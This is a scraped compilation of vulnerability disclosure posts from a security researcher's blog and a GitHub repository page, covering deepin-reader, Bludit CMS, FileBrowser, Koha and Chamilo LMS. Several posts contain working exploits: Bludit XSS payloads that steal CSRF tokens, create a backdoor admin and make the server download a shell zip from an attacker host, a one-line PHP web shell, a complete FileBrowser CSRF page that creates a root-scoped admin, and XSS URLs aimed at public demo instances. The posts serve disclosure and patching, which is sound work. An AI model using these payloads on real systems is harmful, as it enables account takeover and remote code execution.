Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [Stored-XSS to Admin Account Takeover/RCE in Bludit CMS [CRITICAL]](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/)

[6th October 20232nd November 2023](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/#respond)

### Description

There’s a Stored/Persistent Cross-Site Scripting vulnerability in Bludit CMS below 3.15.0 that allows a blog Author(or an attacker with Author user privileges) to create a backdoor Administrator user and even achieve Remote Code Execution on the system. This exploit happens because of the fact that Bludit is not sanitizing any dangerous javascript that’s being injected inside page contents by the Author user, even though the cookie has “httpOnly” flag and the app has a CSRF token in place, this won’t prevent the exploitation.

The attacker (who has Author privs) can carefully craft malicious JS payload that steals Admin’s CSRF token and sends an XHR post request to “/admin/new-user” to create a new Administrator in the background, when the real Admin visits the malicious Blog/Page the JS will get executed in the background. Attacker can then log in to Bludit as the newly created Admin.

Remote Code Execution is achieved by abusing the “Remote Content” plugin. The attacker (who has Author privs) can carefully craft malicious JS payload that steals the Admin’s CSRF token and send XHR Requests in the background that enable “Remote Content” plugin and configure the plugin to download the attacker-controlled malicious zip file from the attacker’s server and also calls the webhook to trigger the plugin. When the real Admin visits the malicious Blog/Page the JS will get executed in the background, now the attacker can simply navigate to “[http://<bludit\_URL>/bl-content/workspaces/remote-content/shell.php&#8221](http://<bludit_URL>/bl-content/workspaces/remote-content/shell.php%26#8221);

![](https://user-images.githubusercontent.com/52229330/254687626-7aee1474-c147-4175-a87a-25d72e44dc2d.png)
### Steps to reproduce the problem

#### Payload1 : Creates another Admin in the background

```
<h2>Hi</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  // Steal CSRF token

const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/new-user", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&new_username=pwn&new_password=pwn123&confirm_password=pwn123&role=admin&email=admin3%40feb.com");  // creating backdoor admin user

}).catch(err => console.log(err))

</script>
```
#### Payload2 : XSS to RCE

```
<h2>Hi Admin</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  //Steal CSRF token

// Install Remote Content Plugin
const inst_plugin = new XMLHttpRequest();
inst_plugin.open("GET", "/admin/install-plugin/pluginRemoteContent", true);
inst_plugin.withCredentials = true;
inst_plugin.send()

// Shell upload plugin configue
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/configure-plugin/pluginRemoteContent", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&webhook=trigger&source=http://192.168.1.39/shell2.zip");  // creating backdoor shell (replace the http://192.168.1.39/shell2.zip with a your own link to the plugin

// Trigger the exploit by calling the Webhook
const trigger = new XMLHttpRequest();
trigger.open("GET", "/trigger", true);
trigger.withCredentials = true;
trigger.send()

}).catch(err => console.log(err))

</script>
```
#### shell.php:

```
<?php system($_GET["cmd"]); ?>
```

1. Log in as Blog Author
2. Create new content.
3. Intercept the HTTP request using any proxy tool such as BurpSuite, URL-encode the payload1 HTML/JS code, and place it inside the “content” parameter of the POST request like below.

![](https://user-images.githubusercontent.com/52229330/254681795-85759fef-0eb1-43e5-b186-6734fd4b72fb.png)

4. To verify it, Open another private browser window and log in as Admin, then visit the malicious content created by the Author, you will be able to see a new user has been created under the users list.

![](https://user-images.githubusercontent.com/52229330/254683692-06e167e7-fc71-452b-96d0-62e71c79077b.png)
#### REMOTE CODE EXECUTION:

1. In order to achieve Remote Code Execution, we need to first create a malicious plugin and serve it for further exploitation

![](https://user-images.githubusercontent.com/52229330/254685541-e03bd9b6-4161-4f27-bc5f-d52780705122.png)

2. URL-encode the payload2 from above, and make changes according to your own environment, then place it inside the “content” parameter in the HTTP request that’s intercepted

![](https://user-images.githubusercontent.com/52229330/254686113-6f94c33e-ac52-42b2-8972-295c4a1a5d76.png)

3. When the admin visits the malicious blog/page, the attacker will achieve RCE on the system.

Payload triggered:

[![](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)

Got Code Execution on target System:

[![](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)

RCE on the target!

*If you are using Bludit CMS in production update to the newer version with patches,always verify the authors, and only allow author accounts to trusted persons in your organization/team.*

# [Stored XSS in FileBrowser leads to Admin account Takeover + RCE](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/)

[15th September 202318th September 2023](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/#respond)

**CVE-2023-39612**

### Description

A Cross-Site Scripting vulnerability is discovered in FileBrowser *below v2.25.0* in which an attacker with a non-admin user account inside the FileBrowser instance can create malicious HTML & JS files, craft them in a specific way, and send the HTML file’s link to the Admin to achieve Account takeover via XSS bypassing the Content-Security-Policy.

**Proof-Of-Concept**:

// *xss.js*

```

alert(document.cookie);

```

// *xss.htm*

```

<script src="/api/raw/poc/xss.js?auth=[jwt_token of the Low Privileged user]"></script>

```

1. Create a folder named “poc” as the non-admin user.
2. Create the 2 files as above (xss.htm and xss.js) under the poc folder.
3. Craft the XSS URL as below and open it as the Admin user to verify the XSS.

```

http://your_filebrowser_ip:port//api/raw/poc/xss.htm?auth=[non-admin user's jwt token]&inline=true

```

It will trigger an alert pop-up with Admin’s Cookie.

#### Explanation

* The parameter “?auth=[non-admin token]” is added in the URL so that when the Admin opens the URL it will fetch those HTML/js files that are created by the non-admin user, otherwise FileBrowser will use the Admin’s original jwt token that’s been stored as Cookie thus leading to a “404 Not Found” Error. This is because those files are created by the non-admin user, so if the API tries to fetch them with Admin’s token it will lead to an error, the API also accepts the jwt token inside a URL get parameter “?auth=”. So, the non-admin user can deliberately supply his own JWT token in the malicious URL for a successful exploitation
* The “?inline=true” parameter is included in the crafted URL because without that parameter FileBrowser will treat the HTML file as an attachment and will download it as a file, so by having “inline=true” the HTML file will be treated as an webpage, and execute the javascript.
* Content-Security-Policy(CSP) is bypassed because FileBrowser sets CSP “default-src” to ‘self’. As the malicious JS is also loaded from the same site, it will get executed.

### Impact

This vulnerability is capable of Admin account takeover. Admin can even run system shell commands and access the filesystem, thus leading to Arbitrary Command execution.

**Fix**:

They fixed the vulnerability by adding a CSP that blocks any Javascript from executing on /api/raw endpoint.

<https://github.com/filebrowser/filebrowser/commit/b508ac3d4f7f0f75d6b49c99bdc661a6d2173f30>

Update to the latest version if you are using Filebrowser.

**Filebrowser v2.25.0 is released**

<https://github.com/filebrowser/filebrowser/releases>

# [XSS vulnerability in Koha integrated library system](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/)

[11th January 202311th January 2023](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/#respond)

This is Febin, a Security Researcher. This article is about a Cross-Site Scripting vulnerability I found in a popular library management system named Koha.

**Koha Library Software**:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha.png?w=394)

Koha is an open-source integrated library system (ILS), used world-wide by public, school and special libraries.

Koha is a web-based ILS, with a SQL database (MariaDB or MySQL preferred) back end with cataloguing data stored in MARC and accessible via Z39.50 or SRU. The user interface is very configurable and adaptable and has been translated into many languages. Koha has most of the features that would be expected in an ILS, including:

```

Various Web 2.0 facilities like tagging, comment, social sharing and RSS feeds
Union catalog facility
Customizable search
Online circulation
Bar code printing
Patron card creation
Report generation
Patron self registration form through OPAC

```

Official Site: <https://koha-community.org/>

**The Vulnerability:**

A Cross-Site Scripting (XSS) vulnerability has been found in Koha Library software that can be used by an external attacker to steal credentials, deliver malware and take over admin account for further exploitation.

The vulnerability exists in the “HTML customizations” and “News” features under “Additional tools”(/cgi-bin/koha/tools/additional-contents.pl).

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_html.png?w=1024)

An attacker can craft a URL and send it to the victim, if the victim is authenticated, then the javascript will get executed and if he’s not authenticated then Koha will prompt its login, after successful sign-in, the XSS payload will get executed. And the payload will be stored under the “HTML customizations” section i.e, whenever the victim visits that section, the XSS payload will be triggered thus making this a persistent XSS

## Proof Of Concept:

There are many demo instances of Koha software that are hosted online and are officially listed on Koha’s official website.

I have used a couple of demo Koha instances to test and prove the vulnerability.

Demo 1: intranet-demo.biblibre.com

Demo Credentials: test/test

<https://intranet-demo.biblibre.com/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss1-1.png?w=1024)

Demo 1: demo-admin.catalyst-koha.com.au

Demo Credentials: staff/staff1

<https://demo-admin.catalyst-koha.com.au//cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss2.png?w=1024)

**Fix:** Disable Javascript in HTML customizations, Sanitize user input, Use anti-CSRF token

<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

**Thanks.**

# Posts navigation

[← Older posts](https://febin0x4e4a.wordpress.com/page/2/)

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

[febiNJ](https://febin0x4e4a.wordpress.com/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from github.com_e04601b2_20250115_193636.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=febinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[febinrev](/febinrev)
/
**[CVE-2021-46398\_Chamilo-LMS-RCE](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE)**
Public

* [Notifications](/login?return_to=%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)
* [Star
   5](/login?return_to=%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)

Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker's profile page.

[5
stars](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/stargazers) [1
fork](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/forks) [Branches](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/branches) [Tags](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/tags) [Activity](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/activity)
 [Star](/login?return_to=%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE)

 [Notifications](/login?return_to=%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE) You must be signed in to change notification settings

* [Code](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE)
* [Issues
  0](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/issues)
* [Pull requests
  0](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/pulls)
* [Actions](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/actions)
* [Projects
  0](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/projects)
* [Security](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/security)
* [Insights](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/pulse)

Additional navigation options

* [Code](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE)
* [Issues](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/issues)
* [Pull requests](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/pulls)
* [Actions](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/actions)
* [Projects](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/projects)
* [Security](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/security)
* [Insights](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/pulse)

# febinrev/CVE-2021-46398\_Chamilo-LMS-RCE

    main[Branches](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/branches)[Tags](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[8 Commits](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/commits/main/) | | |
| [README.md](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/README.md "README.md") | | [README.md](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/README.md "README.md") |  |  |
| [chamilo\_csrf-rce\_exploit.mp4](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/chamilo_csrf-rce_exploit.mp4 "chamilo_csrf-rce_exploit.mp4") | | [chamilo\_csrf-rce\_exploit.mp4](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/chamilo_csrf-rce_exploit.mp4 "chamilo_csrf-rce_exploit.mp4") |  |  |
| [zero-click.ht](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/zero-click.ht "zero-click.ht") | | [zero-click.ht](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/blob/main/zero-click.ht "zero-click.ht") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2021-46398 Chamilo-LMS 1.11.14 RCE

Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker's profile page.

* One-Click Technique: An Attacker who has a student account can create a malicious web page or a malicious SVG image file and upload the file to the "My Productions" section of the student profile page, then he can copy the URL of that file and send it to the Chamilo Admin User. When the Admin user loads the file in his browser with an active chamilo session, in the background it will upload a plugin (.zip file) to chamilo. Then the attacker can simply navigate to /plugin/exploited-directory/ and execute malicious commands.
* "Zero Click" technique: In this case, the attacker abuses the "My Diplomas" feature and injects malicious javascript in it, and when the Admin visits the Attacker's (student) profile page or Portfolio, the malicious javascript gets executed and the malicious plugin gets uploaded to the server. After that, the attacker can simply navigate to /plugin/exploit/ directory and execute the shell.php script and execute arbitrary commands.

Advantages of this exploit: No need to upload a malicious file to /app/upload/users/ directory , No need to send a link or URL to the Admin. When the admin visits attacker's profile, the attacker gets the RCE ;-) .

chamilo\_zeroclick-RCE\_exploit.mp4

## About

Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker's profile page.

### Resources

[Readme](#readme-ov-file)

[Activity](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/activity)
### Stars

[**5**
stars](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/stargazers)
### Watchers

[**2**
watching](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/watchers)
### Forks

[**1**
fork](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ffebinrev%2FCVE-2021-46398_Chamilo-LMS-RCE&report=febinrev+%28user%29)

## [Releases](/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/releases)

No releases published

## [Packages 0](/users/febinrev/packages?repo_name=CVE-2021-46398_Chamilo-LMS-RCE)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from febin0x4e4a.wordpress.com_7672aa02_20250115_193601.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Critical CSRF in FileBrowser

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

